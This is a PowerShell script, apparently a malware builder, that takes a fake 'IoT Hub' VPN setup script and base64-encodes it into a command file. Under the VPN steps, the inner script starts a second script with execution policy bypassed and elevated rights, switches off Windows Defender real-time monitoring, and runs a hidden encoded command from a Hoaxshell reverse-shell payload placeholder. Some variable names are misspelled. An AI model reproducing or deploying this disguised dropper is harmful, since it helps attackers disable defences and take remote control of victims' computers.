$script = @'
# Check if running with administrator privileges
#$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

#if ($isAdmin) {
#    Write-Host "Running as Administrator, continuing with Setup."
#    $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
#} else {
#    Write-Host "Please run as an administrator to continue with VPN setup."
#    Start-Sleep -Seconds 15
#    exit
#}

$VPN_NAME = "IoT Hub" 
$VPN_IP = "127.0.0.1"
$VPN_SECRET = "SuperSecret" 
$VPN_DNS_Name = "iothub.pro" 
$VPN_DNS_SERVER = "127.0.0.1"
$VPN_NETWORK = "127.0.0.1/8"
 
#Configure the VPN on the Windows host.
Write-Host ("Adding the VPN connection...")
Add-VpnConnection -Name $VPN_NAME -ServerAddress $VPN_IP -SplitTunneling -AuthenticationMethod MSChapv2 -L2tpPsk $VPN_SECRET -TunnelType L2tp -Force

#VPN_FINALIZE | Out-File -FilePath "old.ps1" -Encoding utf8
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File old.ps1" -NoNewWindow -Verb RunAs

Write-Host ("Done")
Write-Host ("Adding VPN network")
Add-VpnConnectionRoute -ConnectionName $VPN_NAME -DestinationPrefix $VPN_NETWORK
Write-Host ("Done")
 
 
Add-VpnConnectionTriggerDnsConfiguration -ConnectionName $VPsN_NAME -DnsIPAddress $VPN_DNS_SERVERS -DnsSuffix $VPN_DNS_Name
Write-Host ("VPN configuration complete")
Set-MpPreference -DisableRealtimeMonitoring 1
powershell -e <HOAXSHELL_PAYLOAD_HERE> -WindowStyle Hidden

'@

$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
$encodedScript | Out-File -FilePath "C:\Users\Christopher\Downloads\commmand.txt" -NoNewline -Encoding ascii
